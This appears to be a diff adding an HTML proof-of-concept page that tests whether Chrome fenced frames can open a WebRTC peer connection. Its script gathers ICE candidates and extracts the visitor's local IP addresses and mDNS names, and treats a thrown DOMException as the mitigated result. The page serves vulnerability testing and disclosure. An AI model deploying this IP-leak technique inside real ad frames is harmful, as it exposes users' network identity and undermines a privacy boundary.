@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Fenced Frame WebRTC P2P Leak PoC</title>
+<style>
+body { font-family: monospace; margin: 20px; }
+.section { margin: 20px 0; padding: 10px; border: 1px solid #ccc; }
+#fencedFrameContainer { margin-top: 20px; }
+pre { background: #f4f4f4; padding: 10px; overflow-x: auto; }
+</style>
+</head>
+<body>
+<h1>Fenced Frame WebRTC P2P Leak PoC</h1>
+<p>This PoC demonstrates that fenced frames can create RTCPeerConnection
+and gather ICE candidates, leaking local IP addresses.</p>
+
+<div class="section">
+<h2>Instructions</h2>
+<ol>
+<li>Open this page in Chrome with fenced frames enabled</li>
+<li>The fenced frame below should attempt to create RTCPeerConnection</li>
+<li>If vulnerable: ICE candidates with local IPs will appear</li>
+<li>If mitigated: RTCPeerConnection creation should throw DOMException</li>
+</ol>
+</div>
+
+<div class="section">
+<h2>Fenced Frame Content (inline via data: URL)</h2>
+<p><strong>Note:</strong> For actual testing, the fenced frame content needs to be served from an HTTPS server
+with proper Protected Audience headers, or loaded via a FencedFrameConfig from navigator.runAdAuction().</p>
+</div>
+
+<div class="section">
+<h2>Direct Test (run in any iframe to simulate)</h2>
+<p>Click the button to test RTCPeerConnection in this page context.
+For the real attack, this code would run inside a fenced frame.</p>
+<button onclick="testWebRTC()">Test RTCPeerConnection</button>
+<pre id="output">Click the button to test...\n</pre>
+</div>
+
+<script>
+function testWebRTC() {
+  const output = document.getElementById('output');
+  output.textContent = '';
+
+  try {
+    const pc = new RTCPeerConnection({iceServers: []});
+    output.textContent += '[SUCCESS] RTCPeerConnection created\n';
+    output.textContent += '  - If this runs in a fenced frame, it should be BLOCKED\n\n';
+
+    pc.createDataChannel('leak');
+
+    pc.createOffer().then(offer => {
+      pc.setLocalDescription(offer);
+      output.textContent += '[INFO] SDP offer created, waiting for ICE candidates...\n';
+    }).catch(e => {
+      output.textContent += '[ERROR] createOffer failed: ' + e.message + '\n';
+    });
+
+    pc.onicecandidate = (event) => {
+      if (event.candidate) {
+        const candidate = event.candidate.candidate;
+        output.textContent += '\n[ICE CANDIDATE] ' + candidate + '\n';
+
+        // Extract IP address from candidate string
+        const ipMatch = candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
+        if (ipMatch) {
+          output.textContent += '  >> LEAKED LOCAL IP: ' + ipMatch[1] + '\n';
+          output.textContent += '  >> This IP is now known to the fenced frame origin!\n';
+        }
+
+        // Check for mDNS name
+        const mdnsMatch = candidate.match(/([a-f0-9-]+\.local)/);
+        if (mdnsMatch) {
+          output.textContent += '  >> mDNS name: ' + mdnsMatch[1] + '\n';
+          output.textContent += '  >> (mDNS obfuscation active, but P2P still works)\n';
+        }
+      } else {
+        output.textContent += '\n[DONE] ICE gathering complete\n';
+        output.textContent += '\nSummary: WebRTC P2P is accessible.\n';
+        output.textContent += 'In a fenced frame, this should have been BLOCKED.\n';
+      }
+    };
+  } catch (e) {
+    output.textContent += '[BLOCKED] RTCPeerConnection creation failed:\n';
+    output.textContent += '  ' + e.name + ': ' + e.message + '\n';
+    output.textContent += '\nThis is the EXPECTED behavior for fenced frames.\n';
+  }
+}
+</script>
+</body>
+</html>
